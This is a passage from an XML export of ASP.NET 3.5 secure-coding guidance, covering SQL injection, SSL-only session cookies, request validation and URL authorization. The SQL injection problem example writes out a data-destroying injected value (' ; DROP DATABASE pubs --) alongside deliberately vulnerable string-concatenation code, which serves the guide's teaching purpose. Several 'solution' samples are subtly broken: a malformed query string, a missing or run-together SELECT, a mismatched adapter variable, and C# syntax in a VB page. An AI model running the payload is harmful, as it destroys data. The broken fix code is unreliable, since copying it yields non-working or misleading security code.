&lt;pre&gt;using (SqlConnection connection = new SqlConnection(connectionString))&lt;br&gt;{&lt;br&gt;&amp;nbsp; DataSet userDataset = new DataSet();&lt;br&gt;&amp;nbsp; SqlDataAdapter myCommand = new SqlDataAdapter( &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;quot;LoginStoredProcedure&amp;quot;, connection);&lt;br&gt;&amp;nbsp; myCommand.SelectCommand.CommandType = CommandType.StoredProcedure;&lt;br&gt;&amp;nbsp; myCommand.SelectCommand.Parameters.Add(&amp;quot;@au_id&amp;quot;, SqlDbType.VarChar, 11);&lt;br&gt;&amp;nbsp; myCommand.SelectCommand.Parameters[&amp;quot;@au_id&amp;quot;].Value = AuthId.Text;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; myCommand.Fill(userDataset);&lt;br&gt;}&lt;/pre&gt;
&lt;p&gt;In this case, the @au_id parameter is treated as a literal value and not as executable code. Also, the parameter is checked for type and length. In the preceding code example, the input value cannot be longer than 11 characters. If the data does not conform
 to the type or length defined by the parameter, the SqlParameter class throws an exception.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Use parameters with dynamic SQL.&lt;/strong&gt; If stored procedures are unavailable, use parameters when constructing dynamic SQL statements. The following code shows how to use SqlParametersCollection with dynamic SQL:&lt;/p&gt;
&lt;pre&gt;using System.Data;&lt;br&gt;using System.Data.SqlClient;&lt;/pre&gt;
&lt;pre&gt;using (SqlConnection connection = new SqlConnection(connectionString))&lt;br&gt;{&lt;br&gt;&amp;nbsp; DataSet userDataset = new DataSet();&lt;br&gt;&amp;nbsp; SqlDataAdapter myDataAdapter = new SqlDataAdapter(&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;quot;SELECT au_lname, au_fname FROM Authors WHERE au_id = @au_id&amp;quot;, &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; connection);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br&gt;&amp;nbsp; myCommand.SelectCommand.Parameters.Add(&amp;quot;@au_id&amp;quot;, SqlDbType.VarChar, 11);&lt;br&gt;&amp;nbsp; myCommand.SelectCommand.Parameters[&amp;quot;@au_id&amp;quot;].Value = AuthId.Text;&lt;br&gt;&amp;nbsp; myDataAdapter.Fill(userDataset);&lt;br&gt;}&lt;/pre&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;An ASP.NET book purchasing application has a query interface that allows book titles and authors to be de retrieved by submitting an ISBN. The appllication developer's writes a SQL query&amp;nbsp;to accomplish this task:&lt;/p&gt;
&lt;pre&gt;string SQLstr = &amp;quot;SELECT book_name, author_name FROM book WHERE book_ISBN = '&amp;quot; &amp;#43; ISBN.Text &amp;#43; &amp;quot;'&amp;quot;;&lt;/pre&gt;
&lt;p&gt;The&amp;nbsp;ISBN input is from a textfield in the&amp;nbsp;web&amp;nbsp;form which is used to directly generate&amp;nbsp;the SQL statement. For example:&lt;/p&gt;
&lt;pre&gt;SELECT book_name, author_name FROM book WHERE book_ISBN = '0321194330'&lt;/pre&gt;
&lt;p&gt;Consider what happens when a user types the following string in the&amp;nbsp;ISBN text box, which is expecting an ISBN in the form nnnnnnnnnn:&lt;/p&gt;
&lt;pre&gt;' ; DROP DATABASE pubs&amp;nbsp; --&lt;br&gt;&amp;nbsp; &lt;/pre&gt;
&lt;p&gt;The code inserts the user's malicious input and generates the following query.&lt;/p&gt;
&lt;pre&gt;SELECT book_name, author_name FROM book WHERE book_ISBN = ''; DROP DATABASE pubs --'&amp;nbsp; &lt;/pre&gt;
&lt;p&gt;In this case, the ' (single quotation mark) character that starts the rogue input terminates the current string literal in the SQL statement. The ; (semicolon) character tells SQL that this is the end of the current statement, which is then followed by the
 following malicious SQL code. Finally, the -- (double dash) sequence of characters is a SQL comment that tells SQL to ignore the rest of the text. In this case, SQL ignores the closing ' (single quotation mark) character, which would otherwise cause a SQL
 parser error.&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;An ASP.NET book purchasing application has a query interface that allows book titles and authors to be de retrieved by submitting an ISBN. The appllication developer's writes a SQL query&amp;nbsp;to accomplish this task:&lt;/p&gt;
&lt;pre&gt;string SQLstr = &amp;quot;book_name, author_name FROM book WHERE book_ISBN = '&amp;quot; &amp;#43; ISBN.Text &amp;#43; &amp;quot;'&amp;quot;;&lt;/pre&gt;
&lt;p&gt;The ISBN input is from a textfield in the&amp;nbsp;web&amp;nbsp;form which is used to directly generate&amp;nbsp;the SQL statement. For example:&lt;/p&gt;
&lt;pre&gt;SELECTbook_name, author_name FROM book WHERE book_ISBN = '0321194330'&lt;/pre&gt;
&lt;p&gt;The&amp;nbsp;SQL&amp;nbsp;statement can be made safer by re-writing it as a parameterized, stored procedure:&lt;/p&gt;
&lt;pre&gt;using System.Data;&lt;br&gt;using System.Data.SqlClient;&lt;/pre&gt;
&lt;pre&gt;using (SqlConnection connection = new SqlConnection(connectionString))&lt;br&gt;{&lt;br&gt;&amp;nbsp; DataSet userDataset = new DataSet();&lt;br&gt;&amp;nbsp; SqlDataAdapter myDataAdapter = new SqlDataAdapter(&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;quot;'0321194330'= @isbn&amp;quot;,&amp;nbsp;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; connection);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br&gt;&amp;nbsp; myCommand.SelectCommand.Parameters.Add(&amp;quot;@isbn&amp;quot;, SqlDbType.VarChar, 11);&lt;br&gt;&amp;nbsp; myCommand.SelectCommand.Parameters[&amp;quot;@isbn&amp;quot;].Value = ISBN.Text;&lt;br&gt;&amp;nbsp; myDataAdapter.Fill(userDataset);&lt;br&gt;}&lt;/pre&gt;
&lt;p&gt;The SQL query statement&amp;nbsp;is constructed similarly to&amp;nbsp;the&amp;nbsp;first SQL statement, except that the&amp;nbsp;ISBN column selection criteria is represented as a placeholder rather than directly concatenated into the SQL query. The next two lines specify the variable type,
 the expected length, and the&amp;nbsp;value of the&amp;nbsp;ISBN field used in this particular query.&amp;nbsp; This protects against SQL injection attacks because @isbn is specified as a VarChar, which means it can't possibly be an executable SQL statement.&amp;nbsp;Consequently, it will&amp;nbsp;be
 interpreted by the database driver as a&amp;nbsp;String literal.&amp;nbsp;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;It is important to note that while parameterized, stored procedures will help reduce the risk of SQL injection, there are other script injection vulnerabilities that will be possible. For more information see&amp;nbsp;the related guideline, &amp;quot;Validate Untrusted Input
 Passed to Data Access Methods&amp;quot;. &lt;/p&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:fab1733c-61d7-46a8-88c6-2617a643c0d9"&gt;Use Least Privileged Accounts for Database Access&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:4be4ed09-ed2f-4f05-9e63-e20708807542"&gt;Use Type Safe SQL Parameters when Constructing SQL Queries&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:75fce1f7-10d9-430e-b7ab-ce2b73d9f2bc"&gt;Validate Untrusted Input Passed to Data Access Methods&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>30a0fcea-6b9a-4f9b-b377-ef89fb6ec927</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Use SSL to Protect Session Cookies on Authenticated Pages</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Session Management</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Use SSL to protect session cookies on authenticated pages. &lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Failing to protect authentication tickets is a common vulnerability that can lead to unauthorized spoofing and impersonation, session hijacking, and elevation of privilege.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;All systems which use cookies for authentication should protect those cookies via SSL on all pages which require authentication, and ensure that the cookies are not used/sent for pages which do not require authentication and do not use SSL.
&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Set &lt;strong&gt;requireSSL=&amp;quot;true&amp;quot;&lt;/strong&gt; on the &amp;lt;&lt;strong&gt;forms&lt;/strong&gt;&amp;gt; element, as shown in the following code.&lt;/p&gt;
&lt;pre&gt;&amp;lt;forms loginUrl=&amp;quot;Secure\Login.aspx&amp;quot;&lt;br&gt;       requireSSL=&amp;quot;true&amp;quot; ... /&amp;gt;  &lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;By setting &lt;strong&gt;requireSSL=&amp;quot;true&amp;quot;&lt;/strong&gt;, you set the &lt;strong&gt;secure&lt;/strong&gt; cookie property that determines whether browsers should send the cookie back to the server. With the
&lt;strong&gt;secure&lt;/strong&gt; property set, the cookie is sent by the browser only to a secure page that is requested using an HTTPS URL.
&lt;/p&gt;
&lt;h1&gt;Additional resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;&lt;a href="http://msdn2.microsoft.com/en-us/library/ms998317.aspx"&gt;How To: Use Forms Authentication with SQL Server in ASP.NET&lt;/a&gt;&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;&lt;a href="http://msdn2.microsoft.com/en-us/library/ms998288.aspx"&gt;How To: Configure the Machine Key in ASP.NET&lt;/a&gt;&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;&lt;a href="http://support.microsoft.com/default.aspx?scid=kb;en-us;813829"&gt;Info: Help Secure Forms Authentication by Using Secure Sockets Layer (SSL)&lt;/a&gt;&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>320f3578-7231-41d3-be4b-db79957bd496</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Do Not Rely on Request Validation</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Do not rely on the ASP.NET request validation feature to detect all bad input. Use it only as an extra precautionary measure in addition to your own input validation.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;The ASP.NET request validation feature only performs basic input validation and should not be relied upon to detect all types of malicious data. It is not sufficient even for preventing attacks like cross site scripting and SQL injection, and each application
 has specific validation needs—what is good input to one application may be bad input for another.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;When user input is submitted from a webpage back to the server.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Request validation is enabled by default. You can see this by examining the &lt;strong&gt;
validateRequest&lt;/strong&gt; attribute, which is set to true on the &lt;strong&gt;&amp;lt;pages&amp;gt;&lt;/strong&gt; element in the
&lt;strong&gt;Machine.config.comments &lt;/strong&gt;file. This will automatically try to validate all input submitted to the web application. Ensure that it is enabled for all pages except those that need to accept a range of HTML elements. If you need to disable it for
 a page, set the &lt;strong&gt;ValidateRequest&lt;/strong&gt; attribute to &lt;strong&gt;false&lt;/strong&gt; by using the
&lt;strong&gt;@Page&lt;/strong&gt; directive as follows:&lt;/p&gt;
&lt;pre&gt;&amp;lt;%@ Page Language=&amp;quot;C#&amp;quot; ValidateRequest = &amp;quot;false&amp;quot; %&amp;gt;&lt;/pre&gt;
&lt;p&gt;This feature can also be called explicitly by the server by using the &lt;strong&gt;
Request.ValidateInput()&lt;/strong&gt; call.&lt;/p&gt;
&lt;p&gt;Remember, whether using the page directive to automatically validate or calling
&lt;strong&gt;Request.ValidateInput() &lt;/strong&gt;explicitly, our aim is to only use this feature as an added precaution. In order to ensure that you are handling user data correctly, ensure that you are following all of these steps:
&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Always validate input as strictly as possible against the expected input format via regular expressions. See the guideline
&lt;a href="?#ruledisplay:D06E3B85-CCD8-41EC-8861-36D30BBAE909"&gt;Validate Input for Length, Range, Format, and Type&lt;/a&gt; to learn how to do this effectively.
&lt;/li&gt;&lt;li&gt;Ensure that all queries are fully parameterized, especially if they use user input. See
&lt;a href="?#ruledisplay:3437DF81-6B8C-4A14-BB6E-34F6EE21C45F"&gt;Use Type Safe SQL Parameters When Constructing SQL Queries&lt;/a&gt; to learn how to do so.
&lt;/li&gt;&lt;li&gt;Do not make any security decisions based on user input. To learn how to do so, refer to the guideline
&lt;a href="?#ruledisplay:179C1FD4-A8DA-466B-81EF-202DF7561536"&gt;Do Not Make Security Decisions Based on Client-Accessible Parameters&lt;/a&gt;.
&lt;/li&gt;&lt;li&gt;Do not allow users to input filenames or paths. See the guideline &lt;a href="?#ruledisplay:897EEB0A-23C9-4699-A400-925FFC32C11E"&gt;
Filter All User-Supplied Filename and Path Input&lt;/a&gt; to learn how to do so.&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;In this example which uses an online shopping cart. The cart component consists of two components:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;An HTML form that contains all of the fields that make up the order to be submitted for processing:&lt;/p&gt;
&lt;pre&gt;&amp;lt;html&amp;gt;&lt;br&gt;  &amp;lt;head&amp;gt;&lt;br&gt;    &amp;lt;title&amp;gt;Widget shopping cart&amp;lt;/title&amp;gt;&lt;br&gt;  &amp;lt;/head&amp;gt;&lt;br&gt;  &amp;lt;body&amp;gt;&lt;br&gt;    &amp;lt;H1&amp;gt;welcome to the most boring shopping cart on the web!&amp;lt;/H1&amp;gt;&lt;br&gt;     A widget's current price is $19.95 USD. Please use the following form to submit an order.&lt;br&gt;    &amp;lt;form action=&amp;quot;process_order.aspx&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;&lt;br&gt;       &amp;lt;p&amp;gt;Please enter the number of widgets you would like to purchase:&amp;lt;/p&amp;gt;&lt;br&gt;       quantity:&amp;lt;br/&amp;gt;&lt;br&gt;       &amp;lt;select name=&amp;quot;WidgetQuantity&amp;quot;&amp;gt;&lt;br&gt;        &amp;lt;option value=&amp;quot;1&amp;quot;&amp;gt;1&amp;lt;/option&amp;gt;&lt;br&gt;        &amp;lt;option value=&amp;quot;2&amp;quot;&amp;gt;2&amp;lt;/option&amp;gt;&lt;br&gt;        &amp;lt;option value=&amp;quot;3&amp;quot;&amp;gt;3&amp;lt;/option&amp;gt;&lt;br&gt;        &amp;lt;option value=&amp;quot;4&amp;quot;&amp;gt;4&amp;lt;/option&amp;gt;&lt;br&gt;      &amp;lt;/select&amp;gt;&lt;br&gt;      ...&lt;br&gt;      &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;order&amp;quot;/&amp;gt;&lt;br&gt;    &amp;lt;/form&amp;gt;&lt;br&gt;  &amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;An ASP.NET page that relies on the request validation feature and processes the form submissions and performs the necessary steps to create the order.&lt;/p&gt;
&lt;pre&gt;......&lt;br&gt;try&lt;br&gt;{&lt;br&gt;   Request.ValidateInput();&lt;br&gt;}&lt;br&gt;catch(HttpRequestValidationException e)&lt;br&gt;{&lt;br&gt;   //error out&lt;br&gt;}&lt;br&gt;int dQuantity = Request(&amp;quot;WidgetQuantity&amp;quot;);&lt;br&gt;double dPrice = 19.95;&lt;br&gt;double dCost = dQuantity * dPrice;&lt;br&gt;......&lt;/pre&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;This server side page is problematic because it solely relies on the ASP.NET request validation feature. The application works fine in the case where a user plays by the rules and submits the form as it is shown, because the quantity field ensures that the
 range constraints for the order quantity are always valid. However, if a clever user decides to construct their own form and submits a negative WidgetQuantity field, it causes a negative balance. Depending on what e-commerce system is used, this could result
 in a credit to the user's account. It also might subtract the negative balance from the company's inventory, which would carry significant ramifications and costs later on.&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;Consider the following ASP.NET page that processes the form submissions and performs the necessary steps to create an order:&lt;/p&gt;
&lt;pre&gt;&amp;lt;%@ Page Language=&amp;quot;vb&amp;quot; %&amp;gt;&lt;br&gt;&amp;lt;script runat=server&amp;gt;public sub OnSubmit(source as Object, e as EventArgs)&lt;br&gt;    if Page.IsValid then&lt;br&gt;        ' Now we can perform our transaction.&lt;br&gt;        int dQuantity = Request(&amp;quot;WidgetQuantity&amp;quot;);&lt;br&gt;        double dPrice = 19.95;&lt;br&gt;        double dCost = dQuantity * dPrice;&lt;br&gt;    end if&lt;br&gt;end sub&lt;br&gt;&amp;lt;/script&amp;gt;&lt;br&gt;&amp;lt;html&amp;gt;&lt;br&gt;&amp;lt;head&amp;gt;&lt;br&gt;&amp;lt;title&amp;gt;Validation Sample&amp;lt;/title&amp;gt;&lt;br&gt;&amp;lt;/head&amp;gt;&lt;br&gt;&amp;lt;body&amp;gt;&lt;br&gt;&amp;lt;form runat=server&amp;gt;&lt;br&gt;&amp;lt;asp:ValidationSummary runat=server headertext=&amp;quot;There were errors on the page:&amp;quot; /&amp;gt;&lt;br&gt;&amp;lt;table&amp;gt;&lt;br&gt;  &amp;lt;tr&amp;gt;&lt;br&gt;    &amp;lt;td&amp;gt;&lt;br&gt;        &amp;lt;asp:RequiredFieldValidator runat=server&lt;br&gt;             controltovalidate=&amp;quot;WidgetQuantity&amp;quot;&lt;br&gt;             errormessage=&amp;quot;WidgetQuantity is required.&amp;quot;&amp;gt;&lt;br&gt;        &amp;lt;/asp:RequiredFieldValidator&amp;gt;&lt;br&gt;    &amp;lt;/td&amp;gt;&lt;br&gt;    &amp;lt;td&amp;gt;A widget's current price is $19.95 USD. Please use the following form to submit an order.&amp;lt;/td&amp;gt;&lt;br&gt;    &amp;lt;td&amp;gt;&lt;br&gt;      &amp;lt;select name=&amp;quot;WidgetQuantity&amp;quot;&amp;gt;&lt;br&gt;        &amp;lt;option value=&amp;quot;1&amp;quot;&amp;gt;1&amp;lt;/option&amp;gt;&lt;br&gt;        &amp;lt;option value=&amp;quot;2&amp;quot;&amp;gt;2&amp;lt;/option&amp;gt;&lt;br&gt;        &amp;lt;option value=&amp;quot;3&amp;quot;&amp;gt;3&amp;lt;/option&amp;gt;&lt;br&gt;        &amp;lt;option value=&amp;quot;4&amp;quot;&amp;gt;4&amp;lt;/option&amp;gt;&lt;br&gt;      &amp;lt;/select&amp;gt;&lt;br&gt;     &amp;lt;asp:RegularExpressionValidator runat=server display=dynamic&lt;br&gt;            controltovalidate=&amp;quot;WidgetQuantity&amp;quot;&lt;br&gt;            errormessage=&amp;quot;WidgetQuantity must be a non-zero, positive integer.&amp;quot; &lt;br&gt;            validationexpression=&amp;quot;[1-9]{1}[0-9]{0,7}&amp;quot; /&amp;gt;&lt;br&gt;    &amp;lt;/td&amp;gt;&lt;br&gt;  &amp;lt;/tr&amp;gt;&lt;br&gt;...&lt;br&gt;&amp;lt;/table&amp;gt;&lt;br&gt;&amp;lt;br&amp;gt;&lt;br&gt;&amp;lt;input type=submit runat=server id=cmdSubmit value=Submit onserverclick=OnSubmit&amp;gt;&lt;br&gt;&amp;lt;/form&amp;gt;&lt;br&gt;&amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;/pre&gt;
&lt;p&gt;The ASP.NET Validator control provides client-side validation to reduce roundtrips to the server and improve user experience, but also provides server-side validation to ensure that the widget quantity field is a positive integer. It is also validated as
 a required field that must be provided before submitting the order.&lt;/p&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:58F9B51D-794F-4CFC-B568-7F5E55DEB402"&gt;Guideline: Do Not Rely on Client-Side Validation
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:D06E3B85-CCD8-41EC-8861-36D30BBAE909"&gt;Guideline: Validate Input for Length, Range, Format, and Type
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:3437DF81-6B8C-4A14-BB6E-34F6EE21C45F"&gt;Guideline: Use Type Safe SQL Parameters When Constructing SQL Queries&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:179C1FD4-A8DA-466B-81EF-202DF7561536"&gt;Guideline: Do Not Make Security Decisions Based on Client-Accessible Parameters&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:897EEB0A-23C9-4699-A400-925FFC32C11E"&gt;Guideline: Filter All User-Supplied Filename and Path Input&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1AB38C50-F31D-4CD8-89B1-CE397E6895E8"&gt;Guideline: Encode All Output Data&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:BC10DCE2-CA48-44BF-8BF6-FEFBE8DCCB7E"&gt;Attack: Cross Site Scripting Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764"&gt;Attack: SQL Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:044B9F0A-6A95-442C-BF24-3F890D0B10EF"&gt;Attack: Client-side Validation Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:208A476B-ABCA-4630-9D02-746C52F47017"&gt;Attack: XML Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:198CBDAF-3F87-4291-870D-8B6F077D8D36"&gt;Attack: AJAX Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:2B17E816-C6C4-4B05-BE92-01DC71073F66"&gt;Attack: Response Splitting Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1CCC080F-9290-4BD2-8A2C-6A45F59727B0"&gt;Attack: Xpath-XQuery Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:092BC54D-5A7F-451F-9EB1-AB0A1F1708C0"&gt;Attack: LDAP Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:685CA8C0-E102-4517-A539-4B826D1962EB"&gt;Attack: Double Encoding Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:B9DD25F1-3C5C-40DD-A82E-464D0C02C14D"&gt;Attack: Command Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:41BACAD4-8875-4F83-A9F6-C2263B23ABC4"&gt;Attack: File Name and Path Manipulation Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:C7AC7D00-4AEA-4AFA-AD2D-1E812664BA38"&gt;Attack: Canonicalization Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:A50EAF02-034A-491B-A340-557BE0681C48"&gt;Checklist Item: Request Validation is Not Relied on
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>3651c42d-4155-44b5-8645-629d9cacba07</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Use URL Authorization for Page and Directory Access Control</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authorization</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Use URL authorization to control which users and groups of users have access to the application or to parts of the application.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Rather than having to password protect pages, URL Authorization allows you to tie page access to user accounts or roles.&amp;nbsp;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If your application restricts access to some pages use URL Authorization to enforce these restrictions.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;To configure URL authorization, use an &amp;lt;&lt;strong&gt;authorization&lt;/strong&gt;&amp;gt; element in Web.config and specify which user and/or role names are allowed access to the current directory or the nominated directory or file. ASP.NET on Windows Server 2003 or later
 protects all files in a given directory, even those not mapped to ASP.NET, such as .html, .gif, and .jpg files.
&lt;/p&gt;
&lt;p&gt;Authorization settings in Web.config refer to all of the files in the current directory and all subdirectories unless a subdirectory contains its own Web.config with an &amp;lt;&lt;strong&gt;authorization&lt;/strong&gt;&amp;gt; element. In this case, the settings in the subdirectory
 override the parent directory settings. &lt;/p&gt;
&lt;p&gt;URL authorization can be used for both forms authentication and Windows authentication. In the case of Windows authentication, user names take the form &amp;quot;DomainName\WindowsUserName&amp;quot; and role names take the form &amp;quot;DomainName\WindowsGroupName&amp;quot;. The local administrators
 group is referred to as &amp;quot;BUILTIN\Administrators&amp;quot;. The local users group is referred to as &amp;quot;BUILTIN\Users&amp;quot;. The following example shows Windows users and Windows roles.
&lt;/p&gt;
&lt;pre&gt;&amp;lt;authorization&amp;gt;  &lt;br&gt;&amp;lt;allow users=&amp;quot;DomainName\Bob, DomainName\Mary&amp;quot; /&amp;gt;  &lt;br&gt;&amp;lt;allow roles=&amp;quot;BUILTIN\Administrators, DomainName\Manager&amp;quot; /&amp;gt;  &lt;br&gt;&amp;lt;deny users=&amp;quot;*&amp;quot; /&amp;gt;&lt;br&gt;&amp;lt;/authorization&amp;gt;  &lt;/pre&gt;
&lt;p&gt;The following example uses a custom role. &lt;/p&gt;
&lt;pre&gt;&amp;lt;authorization&amp;gt;  &lt;br&gt;&amp;lt;allow roles=&amp;quot;Manager&amp;quot;/&amp;gt;  &lt;br&gt;&amp;lt;deny users=&amp;quot;*&amp;quot;/&amp;gt;&lt;br&gt;&amp;lt;/authorization&amp;gt;  &lt;/pre&gt;
&lt;p&gt;To apply authorization rules to a specific file or folder, enclose the &amp;lt;&lt;strong&gt;authorization&lt;/strong&gt;&amp;gt; element inside a &amp;lt;&lt;strong&gt;location&lt;/strong&gt;&amp;gt; element as shown here.
&lt;/p&gt;
&lt;pre&gt;&amp;lt;location path=&amp;quot;Secure&amp;quot; &amp;gt;  &lt;br&gt;&amp;lt;system.web&amp;gt;    &lt;br&gt;&amp;lt;authorization&amp;gt;      &lt;br&gt;&amp;lt;deny users=&amp;quot;?&amp;quot; /&amp;gt;    &lt;br&gt;&amp;lt;/authorization&amp;gt;  &lt;br&gt;&amp;lt;/system.web&amp;gt;&lt;br&gt;&amp;lt;/location&amp;gt;  &lt;/pre&gt;
